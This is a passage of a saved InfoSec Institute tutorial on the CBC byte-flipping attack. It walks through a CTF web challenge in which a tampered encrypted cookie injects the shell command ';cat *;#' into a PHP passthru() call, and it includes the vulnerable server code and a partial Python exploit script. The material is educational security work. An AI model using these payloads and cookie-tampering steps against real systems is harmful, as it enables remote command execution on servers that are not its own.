class="line number17 index16 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">return</code> <code class="php variable">$data</code><code class="php plain">;</code></div><div class="line number18 index17 alt1"><code class="php plain">}</code></div><div class="line number19 index18 alt2"><code class="php variable">$v</code> <code class="php plain">= </code><code class="php string">"a:2:{s:4:"</code><code class="php plain">name</code><code class="php string">";s:6:"</code><code class="php plain">sdsdsd</code><code class="php string">";s:8:"</code><code class="php plain">greeting</code><code class="php string">";s:20:"</code><code class="php functions">echo</code> <code class="php string">'Hello sdsdsd!'</code><code class="php string">";}"</code><code class="php plain">;</code></div><div class="line number20 index19 alt1"><code class="php functions">echo</code> <code class="php string">"Plaintext before attack: $vn"</code><code class="php plain">;</code></div><div class="line number21 index20 alt2"><code class="php variable">$b</code> <code class="php plain">= </code><code class="php keyword">array</code><code class="php plain">();</code></div><div class="line number22 index21 alt1"><code class="php variable">$enc</code> <code class="php plain">= </code><code class="php keyword">array</code><code class="php plain">();</code></div><div class="line number23 index22 alt2"><code class="php variable">$enc</code> <code class="php plain">= @encrypt(</code><code class="php variable">$v</code><code class="php plain">);</code></div><div class="line number24 index23 alt1"><code class="php variable">$enc</code><code class="php plain">[2] =&nbsp; </code><code class="php functions">chr</code><code class="php plain">(ord(</code><code class="php variable">$enc</code><code class="php plain">[2]) ^ ord(</code><code class="php string">"6"</code><code class="php plain">) ^ ord (</code><code class="php string">"7"</code><code class="php plain">));</code></div><div class="line number25 index24 alt2"><code class="php variable">$b</code> <code class="php plain">= @decrypt(</code><code class="php variable">$enc</code><code class="php plain">);</code></div><div class="line number26 index25 alt1"><code class="php functions">echo</code> <code class="php string">"Plaintext AFTER attack : $bn"</code><code class="php plain">;</code></div></div></td></tr></tbody></table></div></div>
+<p><span>Try changing the character from “7″ to “A” or something else to see how it works.<br>
+</span></p>
+<p><span><strong>Exercise 2:</strong></span></p>
+<p><span>Now that we understood how this attack works, let’s do a more real-world exercise. Some weeks ago the CTF competition was hosted by the team <a href="http://ebctf.nl/">Eindbazen</a> and there was a Web 400 challenge called “Moo!” You can see all the details of this task at the end of the blog in References 2 and 3; here I am just going to describe the final steps of breaking CBC.<br>
+</span></p>
+<p><span>We were provided with the source code for analysis. Below is the chunk important for this exercise:<br>
+</span></p>
+<p><img alt="" class="lazy " src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/082113_1459_CBCByteFlip5.png" data-original="http://resources.infosecinstitute.com/wp-content/uploads/082113_1459_CBCByteFlip5.png" style="display: inline;"><noscript>&lt;img alt="" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/082113_1459_CBCByteFlip5.png" /&gt;</noscript></p>
+<p><span>Basically, you will submit any text in the POST parameter “name” and the app will respond with a “Hello” message concatenating the text submitted at the end, but two things happen before the message is printed:<br>
+</span></p>
+<p><span>1. The POST “<span style="color: aqua;">name<span>” parameter is filtered out by the PHP <span style="color: lime;">escapeshellarg()<span> function (which mainly will escape single quotes to prevent injecting malicious commands) and then it is stored in the <span style="color: lime;">Array-&amp;gt;greeting<span> field to finally create a cookie encrypted with this value.<br>
+</span></span></span></span></span></span></span></p>
+<p><span>2. The content of <span style="color: lime;">Array-&amp;gt;greeting<span> field is executed via PHP <span style="color: lime;">passthru()<span> function, which is used to execute system commands.<br>
+</span></span></span></span></span></p>
+<p><span>3. Finally, any time the page is accessed, if the cookie already exists, it will be decrypted and its content executed via <span style="color: lime;">passthru()<span> function. <span style="text-decoration: underline;"><em>Here is where our CBC attack will give us a different plaintext, as explained in previous section.</em></span><br>
+</span></span></span></p>
+<p><span>So, I tried to inject the string below into the POST parameter “name”:<br>
+</span></p>
+<p><span style="color: aqua; font-size: 13pt;">name<span> = ‘<span style="color: red;">X<span>‘ + ‘<span style="color: fuchsia;">;cat *;<span style="color: #b4a7d6;">#<span>a’<br>
+</span></span></span></span></span></span></span></p>
+<p><span>I added the char “<span style="color: red;">X<span>” which is the one to be replaced with a single quote via CBC byte flipping attack, then the command to be executed, <span style="color: fuchsia;">;cat *;<span>, and finally an “<span style="color: #b4a7d6;">#<span>“, which is interpreted as a comment by the shell so that we do not get problems with the last single quote inserted by <span style="color: lime;">escapeshellarg()<span> function; therefore our command gets executed successfully.<br>
+</span></span></span></span></span></span></span></span></span></p>
+<p><span>After calculating the exact offset of previous ciphertext block byte to be changed (offset 51), I executed the code below to inject a single quote:<br>
+</span></p>
+<p><span style="color: lime; font-size: 13pt;">pos = 51;<br>
+val = chr(ord(<span style="color: red;">‘X<span style="color: lime;">‘) ^ ord(“<span style="color: red;">‘<span style="color: lime;">“) ^ ord(cookie[<span style="color: red;">pos<span style="color: lime;">]))<br>
+</span></span></span></span></span></span>exploit = cookie[0:pos] + val + cookie[pos + 1:]</span></p>
+<p><span>I am altering the cookie, since it has the whole ciphertext. Finally, I got this result:<br>
+</span></p><!--Ad Injection:random--><style>
+ .btn{
+	padding:0 0 14px 10px;
+}
+ .btn a{
+	display:block;
+	text-align:center;
+	font-weight:bold;
+	text-shadow:1px 1px 1px #214d1e;
+	padding:10px 0 0;
+	font-size:17px;
+	color:#fff;
+	background:url(http://www.infosecinstitute.com/images/btn_green.png) no-repeat;
+	width:240px;
+	height:33px;
+	
+}
+</style>
+<div style="margin:20px 0 25px 0;padding-left:25px;padding-right:25px;background-color:#CEECF5;font-size: medium; border:1px solid">
+<strong>Want to learn more?? </strong> The InfoSec Institute <a href="http://www2.infosecinstitute.com/l/12882/2013-05-28/6g66w"> Ethical Hacking course </a>goes in-depth into the techniques used by malicious, black hat hackers with attention getting lectures and <b>hands-on lab exercises</b>. While these hacking skills can be used for malicious purposes, this class teaches you how to use the same hacking techniques to perform a white-hat, ethical hack, on your organization. You leave with the ability to quantitatively assess and measure threats to information assets; and discover where your organization is most vulnerable to black hat hackers. Some features of this course include:<p>
+
+</p><ul>
+<li style="font-size:medium"><strong>Dual Certification</strong> - CEH and <a href="http://www.iacertification.org/cpt_certified_penetration_tester.html">CPT</a>
+</li><li style="font-size:medium">5 days of Intensive <b>Hands-On Labs</b>
+</li><li style="font-size:medium">Expert Instruction
+</li><li style="font-size:medium">CTF exercises in the evening
+</li><li style="font-size:medium">Most up-to-date proprietary courseware available
+</li></ul>
+
+<center><div class="btn"><a href="http://www2.infosecinstitute.com/l/12882/2013-05-28/6g66w">VIEW ETHICAL HACKING</a></div>
+</center></div>
+<p><img alt="" class="lazy " src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/082113_1459_CBCByteFlip6.png" data-original="http://resources.infosecinstitute.com/wp-content/uploads/082113_1459_CBCByteFlip6.png" style="display: inline;"><noscript>&lt;img alt="" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/082113_1459_CBCByteFlip6.png" /&gt;</noscript></p>
+<p><span>First, we can see <span style="color: yellow;">in yellow <span>that our “X” was successfully changed to a single quote in the second block but, since the first block was altered, it got garbage inserted (<span style="color: lime;">in green<span>) which causes an error when trying to <span style="color: lime;">unserialize()<span> the data (<span style="color: red;">in red<span>) and, therefore, the app did not even try to execute our injection.<br>
+</span></span></span></span></span></span></span></span></span></p>
+<p><span><strong>How to Fix It?</strong></span></p>
+<p><span><strong><br>
+</strong><span>Basically, we need to play with our injected data until we get garbage in the first block that does not cause any problem during unserialization. A way to get around it is by padding our malicious command with alphabetic chars. Therefore we come up with this injection string padding with multiple ‘<span style="color: yellow;">z<span>‘ before and after:<br>
+</span></span></span></span></p>
+<p><span style="color: aqua; font-size: 13pt;">name<span> = <span style="color: yellow;">‘z’*17<span> + ‘<span style="color: red;">X<span>‘ +<span style="color: fuchsia;"> ‘;cat *;#<span>‘ + <span style="color: yellow;">‘z’ *16</span></span></span></span></span></span></span></span></span></p>
+<p><span>After sending above string, voila!!!, <span style="color: lime;">unserialize()<span> does not complain about the garbage received and our shell command is executed successfully!!!!<br>
+</span></span></span></p>
+<p><span>If you want to replicate this exercise, in the Appendix section there is the PHP code running on the server side and the Python script (a little bit modified from code provided by Daniel from hardc0de.ru, thanks!!!) to perform the exploit.<br>
+</span></p>
+<p><span>Finally, I want to thank the guys from the references mentioned below for writing those excellent blogs.<br>
+</span></p>
+<p><span><strong>Referencies</strong></span></p>
+<p><span>1. CRYPTO #2: <a href="http://blog.gdssecurity.com/labs/tag/crypto">http://blog.gdssecurity.com/labs/tag/crypto</a><br>
+</span></p>
+<p><span>2. <a href="http://codezen.fr/2013/08/05/ebctf-2013-web400-cryptoaescbchmac-write-up/">http://codezen.fr/2013/08/05/ebctf-2013-web400-cryptoaescbchmac-write-up/</a><br>
+</span></p>
+<p><span>3. <a href="http://hardc0de.ru/2013/08/04/ebctf-web400/">http://hardc0de.ru/2013/08/04/ebctf-web400/</a><br>
+</span></p>
+<p><span>Enjoy it!<br>
+</span></p>
+<p>Appendix</p>
+<p><span><strong>PHP code:</strong></span></p>
+<div><div id="highlighter_881089" class="syntaxhighlighter  php"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div><div class="line number61 index60 alt2">61</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="php functions">ini_set</code><code class="php plain">(</code><code class="php string">'display_errors'</code><code class="php plain">,1);</code></div><div class="line number2 index1 alt1"><code class="php functions">error_reporting</code><code class="php plain">(E_ALL);</code></div><div class="line number3 index2 alt2">&nbsp;</div><div class="line number4 index3 alt1"><code class="php plain">define(</code><code class="php string">'MY_AES_KEY'</code><code class="php plain">, </code><code class="php string">"abcdef0123456789"</code><code class="php plain">);</code></div><div class="line number5 index4 alt2"><code class="php plain">define(</code><code class="php string">'MY_HMAC_KEY'</code><code class="php plain">,</code><code class="php string">"1234567890123456"</code> <code class="php plain">);</code></div><div class="line number6 index5 alt1"><code class="php plain">#define(</code><code class="php string">"FLAG"</code><code class="php plain">,</code><code class="php string">"CENSORED"</code><code class="php plain">);</code></div><div class="line number7 index6 alt2">&nbsp;</div><div class="line number8 index7 alt1"><code class="php keyword">function</code> <code class="php plain">aes(</code><code class="php variable">$data</code><code class="php plain">, </code><code class="php variable">$encrypt</code><code class="php plain">) {</code></div><div class="line number9 index8 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$aes</code> <code class="php plain">= mcrypt_module_open(MCRYPT_RIJNDAEL_128, </code><code class="php string">''</code><code class="php plain">, MCRYPT_MODE_CBC, </code><code class="php string">''</code><code class="php plain">);</code></div><div class="line number10 index9 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$iv</code> <code class="php plain">= mcrypt_create_iv (mcrypt_enc_get_iv_size(</code><code class="php variable">$aes</code><code class="php plain">), MCRYPT_RAND);</code></div><div class="line number11 index10 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$iv</code> <code class="php plain">= </code><code class="php string">"1234567891234567"</code><code class="php plain">;</code></div><div class="line number12 index11 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">mcrypt_generic_init(</code><code class="php variable">$aes</code><code class="php plain">, MY_AES_KEY, </code><code class="php variable">$iv</code><code class="php plain">);</code></div><div class="line number13 index12 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">return</code> <code class="php variable">$encrypt</code> <code class="php plain">? mcrypt_generic(</code><code class="php variable">$aes</code><code class="php plain">, </code><code class="php variable">$data</code><code class="php plain">) : mdecrypt_generic(</code><code class="php variable">$aes</code><code class="php plain">, </code><code class="php variable">$data</code><code class="php plain">);</code></div><div class="line number14 index13 alt1"><code class="php plain">}</code></div><div class="line number15 index14 alt2">&nbsp;</div><div class="line number16 index15 alt1"><code class="php plain">define(</code><code class="php string">'MY_MAC_LEN'</code><code class="php plain">, 40);</code></div><div class="line number17 index16 alt2">&nbsp;</div><div class="line number18 index17 alt1"><code class="php keyword">function</code> <code class="php plain">hmac(</code><code class="php variable">$data</code><code class="php plain">) {</code></div><div class="line number19 index18 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">return</code> <code class="php plain">hash_hmac(</code><code class="php string">'sha1'</code><code class="php plain">, data, MY_HMAC_KEY);</code></div><div class="line number20 index19 alt1"><code class="php plain">}</code></div><div class="line number21 index20 alt2">&nbsp;</div><div class="line number22 index21 alt1"><code class="php keyword">function</code> <code class="php plain">encrypt(</code><code class="php variable">$data</code><code class="php plain">) {</code></div><div class="line number23 index22 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">return</code> <code class="php plain">aes(</code><code class="php variable">$data</code> <code class="php plain">. hmac(</code><code class="php variable">$data</code><code class="php plain">), true);</code></div><div class="line number24 index23 alt1"><code class="php plain">}</code></div><div class="line number25 index24 alt2">&nbsp;</div><div class="line number26 index25 alt1"><code class="php keyword">function</code> <code class="php plain">decrypt(</code><code class="php variable">$data</code><code class="php plain">) {</code></div><div class="line number27 index26 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$data</code> <code class="php plain">= rtrim(aes(</code><code class="php variable">$data</code><code class="php plain">, false), </code><code class="php string">"\0"</code><code class="php plain">);</code></div><div class="line number28 index27 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$mac</code> <code class="php plain">= </code><code class="php functions">substr</code><code class="php plain">(</code><code class="php variable">$data</code><code class="php plain">, -MY_MAC_LEN);</code></div><div class="line number29 index28 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$data</code> <code class="php plain">= </code><code class="php functions">substr</code><code class="php plain">(</code><code class="php variable">$data</code><code class="php plain">, 0, -MY_MAC_LEN);</code></div><div class="line number30 index29 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">return</code> <code class="php plain">hmac(</code><code class="php variable">$data</code><code class="php plain">) === </code><code class="php variable">$mac</code> <code class="php plain">? </code><code class="php variable">$data</code> <code class="php plain">: null;</code></div><div class="line number31 index30 alt2"><code class="php plain">}</code></div><div class="line number32 index31 alt1"><code class="php variable">$settings</code> <code class="php plain">= </code><code class="php keyword">array</code><code class="php plain">();</code></div><div class="line number33 index32 alt2"><code class="php keyword">if</code> <code class="php plain">(@</code><code class="php variable">$_COOKIE</code><code class="php plain">[</code><code class="php string">'settings'</code><code class="php plain">]) {</code></div><div class="line number34 index33 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php functions">echo</code> <code class="php plain">@decrypt(</code><code class="php functions">base64_decode</code><code class="php plain">(</code><code class="php variable">$_COOKIE</code><code class="php plain">[</code><code class="php string">'settings'</code><code class="php plain">]));</code></div><div class="line number35 index34 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$settings</code> <code class="php plain">= unserialize(@decrypt(</code><code class="php functions">base64_decode</code><code class="php plain">(</code><code class="php variable">$_COOKIE</code><code class="php plain">[</code><code class="php string">'settings'</code><code class="php plain">])));</code></div><div class="line number36 index35 alt1"><code class="php plain">}</code></div><div class="line number37 index36 alt2"><code class="php keyword">if</code> <code class="php plain">(@</code><code class="php variable">$_POST</code><code class="php plain">[</code><code class="php string">'name'</code><code class="php plain">] &amp;&amp; </code><code class="php functions">is_string</code><code class="php plain">(</code><code class="php variable">$_POST</code><code class="php plain">[</code><code class="php string">'name'</code><code class="php plain">]) &amp;&amp; </code><code class="php functions">strlen</code><code class="php plain">(</code><code class="php variable">$_POST</code><code class="php plain">[</code><code class="php string">'name'</code><code class="php plain">]) &lt; 200) {</code></div><div class="line number38 index37 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$settings</code> <code class="php plain">= </code><code class="php keyword">array</code><code class="php plain">(</code></div><div class="line number39 index38 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php string">'name'</code> <code class="php plain">=&gt; </code><code class="php variable">$_POST</code><code class="php plain">[</code><code class="php string">'name'</code><code class="php plain">],</code></div><div class="line number40 index39 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php string">'greeting'</code> <code class="php plain">=&gt; (</code><code class="php string">'echo '</code> <code class="php plain">. </code><code class="php functions">escapeshellarg</code><code class="php plain">(</code><code class="php string">"Hello {$_POST['name']}!"</code><code class="php plain">)),</code></div><div class="line number41 index40 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">);</code></div><div class="line number42 index41 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">setcookie(</code><code class="php string">'settings'</code><code class="php plain">, </code><code class="php functions">base64_encode</code><code class="php plain">(@encrypt(serialize(</code><code class="php variable">$settings</code><code class="php plain">))));</code></div><div class="line number43 index42 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">#setcookie(</code><code class="php string">'settings'</code><code class="php plain">, serialize(</code><code class="php variable">$settings</code><code class="php plain">));</code></div><div class="line number44 index43 alt1"><code class="php plain">}</code></div><div class="line number45 index44 alt2"><code class="php variable">$d</code> <code class="php plain">= </code><code class="php keyword">array</code><code class="php plain">();</code></div><div class="line number46 index45 alt1"><code class="php keyword">if</code> <code class="php plain">(@</code><code class="php variable">$settings</code><code class="php plain">[</code><code class="php string">'greeting'</code><code class="php plain">]) {</code></div><div class="line number47 index46 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php functions">passthru</code><code class="php plain">(</code><code class="php variable">$settings</code><code class="php plain">[</code><code class="php string">'greeting'</code><code class="php plain">]);</code></div><div class="line number48 index47 alt1"><code class="php keyword">else</code> <code class="php plain">{</code></div><div class="line number49 index48 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php functions">echo</code> <code class="php plain">"&lt;/pre&gt;</code></div><div class="line number50 index49 alt1"><code class="php plain">&lt;form action=</code><code class="php string">"&amp;quot;?&amp;quot;"</code> <code class="php plain">method=</code><code class="php string">"&amp;quot;POST&amp;quot;"</code><code class="php plain">&gt;n";</code></div><div class="line number51 index50 alt2"><code class="php spaces">&nbsp;</code><code class="php functions">echo</code> <code class="php plain">"</code></div><div class="line number52 index51 alt1"><code class="php plain">What is your name?</code></div><div class="line number53 index52 alt2">&nbsp;</div><div class="line number54 index53 alt1"><code class="php plain">n";</code></div><div class="line number55 index54 alt2"><code class="php spaces">&nbsp;</code><code class="php functions">echo</code> <code class="php string">"&lt;input type="</code><code class="php plain">&amp;quot;text&amp;quot;</code><code class="php string">" name="</code><code class="php plain">&amp;quot;name&amp;quot;</code><code class="php string">" /&gt;n"</code><code class="php plain">;</code></div><div class="line number56 index55 alt1"><code class="php spaces">&nbsp;</code><code class="php functions">echo</code> <code class="php string">"&lt;input type="</code><code class="php plain">&amp;quot;submit&amp;quot;</code><code class="php string">" name="</code><code class="php plain">&amp;quot;submit&amp;quot;</code><code class="php string">" value="</code><code class="php plain">&amp;quot;Submit&amp;quot;</code><code class="php string">" /&gt;n"</code><code class="php plain">;</code></div><div class="line number57 index56 alt2"><code class="php spaces">&nbsp;</code><code class="php functions">echo</code> <code class="php plain">"&lt;/form&gt;</code></div><div class="line number58 index57 alt1"><code class="php plain">&lt;pre&gt;</code></div><div class="line number59 index58 alt2"><code class="php plain">n";</code></div><div class="line number60 index59 alt1"><code class="php plain">}</code></div><div class="line number61 index60 alt2"><code class="php plain">?&gt;</code></div></div></td></tr></tbody></table></div></div>
+<p><span><strong>Exploit:</strong></span></p>
+<div><div id="highlighter_333912" class="syntaxhighlighter  php"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div><div class="line number61 index60 alt2">61</div><div class="line number62 index61 alt1">62</div><div class="line number63 index62 alt2">63</div><div class="line number64 index63 alt1">64</div><div class="line number65 index64 alt2">65</div><div class="line number66 index65 alt1">66</div><div class="line number67 index66 alt2">67</div><div class="line number68 index67 alt1">68</div><div class="line number69 index68 alt2">69</div><div class="line number70 index69 alt1">70</div><div class="line number71 index70 alt2">71</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="php plain">#!/usr/bin/python</code></div><div class="line number2 index1 alt1"><code class="php plain">import requests</code></div><div class="line number3 index2 alt2"><code class="php plain">import sys</code></div><div class="line number4 index3 alt1"><code class="php plain">import urllib</code></div><div class="line number5 index4 alt2"><code class="php plain">from base64 import b64decode </code><code class="php keyword">as</code> <code class="php plain">dec</code></div><div class="line number6 index5 alt1"><code class="php plain">from base64 import b64encode </code><code class="php keyword">as</code> <code class="php plain">enc</code></div><div class="line number7 index6 alt2">&nbsp;</div><div class="line number8 index7 alt1"><code class="php plain">url = </code><code class="php string">'<a href="http://192.168.184.133/ebctf/mine.php">http://192.168.184.133/ebctf/mine.php</a>'</code></div><div class="line number9 index8 alt2">&nbsp;</div><div class="line number10 index9 alt1"><code class="php plain">def Test(x):</code></div><div class="line number11 index10 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">t = </code><code class="php string">"echo 'Hello %s!'"</code> <code class="php plain">% x</code></div><div class="line number12 index11 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">s = </code><code class="php string">'a:2:{s:4:"name";s:%s:"%s";s:8:"greeting";s:%s:"%s";}%s'</code> <code class="php plain">% (len(x),x,len(t),t, </code><code class="php string">'X'</code><code class="php plain">*40)</code></div><div class="line number13 index12 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">for</code> <code class="php plain">i in xrange(0,len(s),16):</code></div><div class="line number14 index13 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php functions">print</code> <code class="php plain">s[i:i+16]</code></div><div class="line number15 index14 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php functions">print</code> <code class="php string">'n'</code></div><div class="line number16 index15 alt1">&nbsp;</div><div class="line number17 index16 alt2"><code class="php plain">def Pwn(s):</code></div><div class="line number18 index17 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">global</code> <code class="php plain">url</code></div><div class="line number19 index18 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">s = urllib.quote_plus(enc(s))</code></div><div class="line number20 index19 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">req = requests.get(url, cookies = {</code><code class="php string">'settings'</code> <code class="php plain">: s}).content</code></div><div class="line number21 index20 alt2"><code class="php spaces">&nbsp;</code><code class="php plain">#&nbsp;&nbsp; </code><code class="php keyword">if</code> <code class="php plain">req.find(</code><code class="php string">'works'</code><code class="php plain">) != -1:</code></div><div class="line number22 index21 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php functions">print</code> <code class="php plain">req</code></div><div class="line number23 index22 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php plain">#&nbsp; </code><code class="php keyword">else</code><code class="php plain">:</code></div><div class="line number24 index23 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;</code><code class="php plain">#&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="php functions">print</code> <code class="php string">'[-] FAIL'</code></div><div class="line number25 index24 alt2">&nbsp;</div><div class="line number26 index25 alt1"><code class="php plain">def GetCookie(name):</code></div><div class="line number27 index26 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">global</code> <code class="php plain">url</code></div><div class="line number28 index27 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">d = {</code></div><div class="line number29 index28 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php string">'name'</code><code class="php plain">:name,</code></div><div class="line number30 index29 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php string">'submit'</code><code class="php plain">:</code><code class="php string">'Submit'</code></div><div class="line number31 index30 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">}</code></div><div class="line number32 index31 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">h = requests.post(url, data = d, headers = {</code><code class="php string">'Content-Type'</code> <code class="php plain">: </code><code class="php string">'application/x-www-form-urlencoded'</code><code class="php plain">}).headers</code></div><div class="line number33 index32 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">if</code> <code class="php plain">h.has_key(</code><code class="php string">'set-cookie'</code><code class="php plain">):</code></div><div class="line number34 index33 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">h = 